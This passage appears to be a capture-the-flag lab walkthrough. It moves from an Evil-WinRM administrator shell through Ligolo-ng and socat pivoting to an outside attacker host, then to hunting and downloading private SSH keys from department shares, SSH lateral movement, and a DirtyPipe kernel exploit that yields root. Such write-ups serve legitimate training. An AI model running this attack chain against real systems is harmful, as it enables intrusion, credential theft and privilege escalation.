Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Windows Network Scan - Ping Sweep

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::ddb0:3e55:80ee:f04c%4
   IPv4 Address. . . . . . . . . . . : 172.16.8.3
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.8.1

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5537:9cb6:355:5e35%7
   IPv4 Address. . . . . . . . . . . : 172.16.9.3
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.9.1
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

172.16.9.1: False
172.16.9.2: False
172.16.9.3: True

[SNIP]

172.16.9.25: True
```

#### Pivoting, Tunneling & Port Forwarding - Ligolo-ng Double Pivot

```
┌──(nabla㉿kali)-[~]
└─$ scp socat srvadm@inlanefreight.local:~

srvadm@inlanefreight.local's password: 

socat                                         100%  371KB   8.1MB/s   00:00
```

```
srvadm@dmz01:~$ ./socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.10.15.59:443
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ligolo-agent.exe c:\users\public\

Info: Uploading /home/htb-ac-1461567/ligolo-agent.exe to c:\users\public\

*Evil-WinRM* PS C:\Users\Administrator\Documents> Start-Process "C:\Users\Public\ligolo-agent.exe" -ArgumentList "-connect 172.16.8.120:8443 -ignore-cert"
```

```
[CONTINUE]

[Agent : srvadm@dmz01] » INFO[1488] Agent joined.                                 id=00505694d4ce name="INLANEFREIGHT\\Administrator@DC01" remote="10.129.32.67:50540"

[Agent : INLANEFREIGHT\Administrator@DC01] » session
? Specify a session : 1 - srvadm@dmz01 - 10.129.32.67:50054 - 00505694aaad
[Agent : srvadm@dmz01] » stop
[Agent : srvadm@dmz01] » INFO[1642] Closing tunnel to srvadm@dmz01 (00505694aaad)... 

[Agent : srvadm@dmz01] » session
? Specify a session : 2 - INLANEFREIGHT\Administrator@DC01 - 10.129.32.67:50540 - 00505694d4ce
[Agent : INLANEFREIGHT\Administrator@DC01] » start
INFO[1650] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (00505694d4ce) 
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo ip route add 172.16.9.0/24 dev ligolo

┌──(nabla㉿kali)-[~]
└─$ ip route list

[SNIP]

172.16.8.0/24 dev ligolo scope link 
172.16.9.0/24 dev ligolo scope link
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p22 172.16.9.25 -T4

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
```

#### Pillaging - Credential Hunting

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Department Shares
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---        6/22/2022   9:58 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---         6/1/2022  11:07 AM                Users
d-----        6/22/2022  10:07 PM                Windows

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir "C:\Department Shares"

    Directory: C:\Department Shares

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Accounting
d-----         6/1/2022  11:34 AM                Executives
d-----         6/1/2022  11:34 AM                Finance
d-----         6/1/2022  11:33 AM                HR
d-----         6/1/2022  11:33 AM                IT
d-----         6/1/2022  11:33 AM                Marketing
d-----         6/1/2022  11:33 AM                R&D
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem "C:\Department Shares" -Recurse -Force -File -ErrorAction SilentlyContinue | Select-String -Pattern 'BEGIN OPENSSH PRIVATE KEY','BEGIN RSA PRIVATE KEY','BEGIN DSA PRIVATE KEY','BEGIN EC PRIVATE KEY','PuTTY-User-Key-File-' -List

[SNIP]

C:\Department Shares\IT\Private\Networking\harry-id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
C:\Department Shares\IT\Private\Networking\james-id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Copy-Item -LiteralPath 'C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa' -Destination "$pwd\ssmallsadm-id_rsa"

*Evil-WinRM* PS C:\Users\Administrator\Documents> download ssmallsadm-id_rsa

Info: Downloading C:\Users\Administrator\Documents\ssmallsadm-id_rsa to ssmallsadm-id_rsa
Info: Download successful!
```

#### Linux Lateral Movement - SSH

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25

[SNIP]

ssmallsadm@MGMT01:~$ 
```

```
ssmallsadm@MGMT01:~$ whoami

ssmallsadm

ssmallsadm@MGMT01:~$ hostname

MGMT01
```

```
ssmallsadm@MGMT01:~$ cat /home/ssmallsadm/flag.txt

3c499*************************** 📌
```

#### Linux Privilege Escalation - Kernel Exploit

```
ssmallsadm@MGMT01:~$ uname -a

Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```
ssmallsadm@MGMT01:~$ find / -perm -4000 2> /dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

┌──(nabla㉿kali)-[~]
└─$ cp ./CVE-2022-0847-DirtyPipe-Exploits/exploit-2.c ~/dirtypipe.c
```

```
┌──(nabla㉿kali)-[~]
└─$ scp -i ssmallsadm-id_rsa ./dirtypipe.c ssmallsadm@172.16.9.25:~
```

```
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# 
```

```
# id

uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
```

```
# cat /root/flag.txt

206c0*************************** 📌
```

---
---
